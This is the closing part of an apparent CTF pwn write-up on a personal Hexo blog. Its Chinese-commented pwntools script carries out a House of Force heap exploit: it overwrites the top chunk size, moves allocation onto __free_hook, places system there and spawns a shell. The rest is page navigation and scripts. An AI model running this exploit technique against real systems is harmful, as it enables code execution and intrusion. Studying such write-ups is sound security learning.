class="number">0x20</span>,<span class="string">'0'</span>*<span class="number">8</span>)</span><br><span class="line">new_top = u64(p.recv()[:<span class="number">8</span>])</span><br><span class="line">log.info(<span class="string">'new_top:%#x '</span>%new_top)</span><br><span class="line"></span><br><span class="line"><span class="comment">#其中new_top+0x868对应于top的地址，注意new_top是记录这个值的地址</span></span><br><span class="line"><span class="comment">#+0x20是在top提升之后对应的地址</span></span><br><span class="line"><span class="comment">#-0x8是考虑到malloc时会向16对齐的问题</span></span><br><span class="line">routine(<span class="number">0xf0</span>,p64(sys_addr+libc_base+libc.symbols[<span class="string">'__free_hook'</span>]-(new_top+<span class="number">0x868</span>+<span class="number">0x20</span>)<span class="number">-0x8</span>)*(<span class="number">0xf0</span>/<span class="number">8</span>))</span><br><span class="line">p.sendline(str(new_top+<span class="number">1</span>))</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.clean()</span><br><span class="line"></span><br><span class="line"><span class="comment">#设libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)为offset，即当前top与free_hook之间的偏移为offset</span></span><br><span class="line"><span class="comment">#则上一步将top的size写成offset-8+sys_addr，此处分配了offset-16的大小</span></span><br><span class="line"><span class="comment">#在调试时查看到offset是以8结尾的，则malloc（offset-16），会进行（offset-16+8)对16向上取整，即实际分配offset-8大小的内存，则top的size恰好就变为sys_addr，而分配了offset-8之后，top地址正好挪到了free_hook-8处，则size正好写在了free_hook处</span></span><br><span class="line">routine(libc_base+libc.symbols[<span class="string">'__free_hook'</span>]-(new_top+<span class="number">0x868</span>+<span class="number">0x20</span>)<span class="number">-0x10</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">routine(<span class="number">0x10</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/27/青岛链湾杯-note/" rel="next" title="青岛链湾杯--note">
+                <i class="fa fa-chevron-left"></i> 青岛链湾杯--note
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">0gur1</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本逻辑"><span class="nav-number">1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#地址泄露"><span class="nav-number">3.1.</span> <span class="nav-text">地址泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#劫持执行流"><span class="nav-number">3.2.</span> <span class="nav-text">劫持执行流</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用脚本"><span class="nav-number">4.</span> <span class="nav-text">利用脚本</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0gur1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
